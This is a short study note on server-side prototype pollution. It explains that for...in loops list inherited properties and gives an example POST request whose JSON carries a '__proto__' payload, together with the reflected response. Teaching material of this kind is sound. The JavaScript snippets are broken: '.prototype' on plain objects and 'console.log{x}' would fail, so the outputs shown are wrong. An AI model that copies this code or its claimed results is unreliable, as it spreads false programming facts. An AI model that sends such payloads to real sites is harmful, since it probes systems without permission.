# Polluted Property Reflection

A Javascript's `for...in` loop iterates all over the object's properties including the ones that have been polluted. Example:

```js
const ObjectSaya = {a: 4, b: 2};

// Polluted the property
ObjectSaya.prototype.foo = 'bar';

// Check the object doesn't have its own 'foo' property, only inherited
ObjectSaya.hasOwnProperty('foo');  // False

// List names of properties from the object
for(const x in ObjectSaya){
	console.log{x}
}

// Output: a, b, foo
```

This also applies to arrays, when looping over indexes

```js
const ArraySaya = ['a', 'b'];

// Polluted the property
ArraySaya.prototype.foo = 'bar';

// List indexes from the array
for (const x in ArraySaya){
	console.log{x}
}

// Output: 0, 1, foo
```

***

Either way, if an application returns properties in a response, especially in a POST or PUT request that submits JSON data, they can be prime targets for Server-Side Prototype Pollution. In this case, we are polluting the global `Object.prototype`

```json
POST /user/update HTTP/1.1 
Host: vulnerable-website.com 
... 
{ 
	"user":"wiener", 
	"firstName":"Peter", 
	"lastName":"Wiener", 
	"__proto__":{ 
		"foo":"bar" 
	} 
}
```

If the website is vulnerable, the injected property would appear in the response:

```json
HTTP/1.1 200 OK 
... 
{ 
	"username":"wiener", 
	"firstName":"Peter", 
	"lastName":"Wiener", 
	"foo":"bar" 
}
```
